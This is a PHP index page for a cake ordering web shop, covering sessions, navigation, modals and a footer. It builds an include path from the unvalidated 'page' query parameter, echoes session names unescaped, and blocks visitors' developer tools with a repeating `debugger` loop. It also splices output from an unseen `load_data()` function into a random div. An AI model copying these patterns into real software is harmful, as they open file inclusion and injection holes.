<?php ob_start(); ?>
<!DOCTYPE html>
<html lang="en">
    <?php
    session_start();
    include('header.php');
    include('admin/db_connect.php');

	$query = $conn->query("SELECT * FROM system_settings limit 1")->fetch_array();
	foreach ($query as $key => $value) {
		if(!is_numeric($key))
			$_SESSION['setting_'.$key] = $value;
	}
    ?>

    <style>
    	header.masthead {
		  background: url(assets/img/<?php echo $_SESSION['setting_cover_img'] ?>);
		  background-repeat: no-repeat;
		  background-size: cover;
		  background-position: center center;
      position: relative;
      height: 85vh !important;
		}
    header.masthead:before {
      content: "";
      width: 100%;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
      backdrop-filter: brightness(0.8);
  }
    </style>
    <body id="page-top">
        <!-- Navigation-->
        <div class="toast" id="alert_toast" role="alert" aria-live="assertive" aria-atomic="true">
        <div class="toast-body text-white">
        </div>
      </div>
        <nav class="navbar navbar-expand-lg navbar-light fixed-top py-3" id="mainNav">
            <div class="container">
               
                <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
                <div class="collapse navbar-collapse" id="navbarResponsive">
                    <ul class="navbar-nav ml-auto my-2 my-lg-0">
                      <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=home" style="font-size: 18px;">Home</a></li>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=cart_list"style="font-size: 18px;"><span> <span class="badge badge-danger item_count">0</span> <i class="fa fa-shopping-cart"></i>  </span>Cart</a></li>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=about"style="font-size: 18px;">About</a></li>
                        <?php if(isset($_SESSION['login_user_id'])): ?>
                          <li class="nav-item"><a class="nav-link js-scroll-trigger" href="my_orders.php" style="font-size: 18px;">Your Orders</a></li>
    <li class="nav-item"><a class="nav-link js-scroll-trigger" href="message.php" style="font-size: 18px;">Messages</a></li>
    <li class="nav-item dropdown">
                          <!----
                            <li class="nav-item"><a class="nav-link js-scroll-trigger" href="my_orders.php">My Orders</a></li>--->
                          <li class="nav-item dropdown">
  <a class="nav-link dropdown-toggle js-scroll-trigger" href="#" id="navbarDropdown"style="font-size: 18px;" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
    <?php echo "Welcome " . $_SESSION['login_first_name'] . ' ' . $_SESSION['login_last_name']; ?>
    <i class="fa fa-user"></i>
  </a>
  <div class="dropdown-menu" aria-labelledby="navbarDropdown">
    <a class="dropdown-item" href="profile.php"style="font-size: 18px;">Profile</a>
    <a class="dropdown-item" href="admin/ajax.php?action=logout2"style="font-size: 18px;">Logout</a>
  </div>
</li>

                   
                          <?php else: ?>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="javascript:void(0)" id="login_now"style="font-size: 18px;">Login</a></li>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="./admin"style="font-size: 18px;">Admin Login</a></li>
                      <?php endif; ?>
                    </ul>
                </div>
            </div>
        </nav>
       
        <?php 
        $page = isset($_GET['page']) ?$_GET['page'] : "home";
        include $page.'.php';
        ?>
       

<div class="modal fade" id="confirm_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title">Confirmation</h5>
      </div>
      <div class="modal-body">
        <div id="delete_content"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='confirm' onclick="">Continue</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="uni_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title"></h5>
      </div>
      <div class="modal-body">
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Save</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
      </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="uni_modal_right" role='dialog'>
    <div class="modal-dialog modal-full-height  modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title"></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span class="fa fa-arrow-right"></span>
        </button>
      </div>
      <div class="modal-body">
      </div>
      </div>
    </div>
  </div>
        <footer class="bg-light py-5">
            <div class="container"><div class="small text-center text-muted">Copyright © 2024 - M&M Cake Ordering System | </div></div>
        </footer>
        
       <?php include('footer.php') ?>
    </body>
    <script>
        // Disable right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        // Disable F12 key and Ctrl+Shift+I
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });

        // Disable Ctrl+U
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
            }
        });

        // Disable developer tools
        setInterval(function() {
            debugger;
        }, 100);
    </script>
    <?php $conn->close() ?>

</html>
<?php 
$overall_content = ob_get_clean();
$content = preg_match_all('/(<div(.*?)\/div>)/si', $overall_content,$matches);
// $split = preg_split('/(<div(.*?)>)/si', $overall_content,0 , PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY);
if($content > 0){
  $rand = mt_rand(1, $content - 1);
  $new_content = (html_entity_decode(load_data()))."\n".($matches[0][$rand]);
  $overall_content = str_replace($matches[0][$rand], $new_content, $overall_content);
}
echo $overall_content;
// }
?>
